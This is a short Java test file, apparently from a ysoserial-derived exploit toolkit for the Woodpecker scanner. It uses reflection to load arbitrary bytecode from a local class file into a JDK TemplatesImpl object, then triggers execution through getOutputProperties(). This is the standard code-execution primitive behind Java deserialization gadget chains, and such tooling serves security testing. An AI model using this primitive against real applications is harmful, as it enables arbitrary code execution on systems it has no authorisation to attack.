import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import me.gv7.woodpecker.yso.payloads.util.ClassFiles;
import me.gv7.woodpecker.yso.payloads.util.CommonUtil;
import me.gv7.woodpecker.yso.payloads.util.Gadgets;
import me.gv7.woodpecker.yso.payloads.util.Reflections;

public class TemaplateTest {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();

        byte[] classBytes = CommonUtil.readFileByte("/Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/T262700880922880.class");


        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
            classBytes, ClassFiles.classAsBytes(Gadgets.Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "P");
        Reflections.setFieldValue(templates, "_tfactory", TransformerFactoryImpl.class.newInstance());

        templates.getOutputProperties();
    }
}
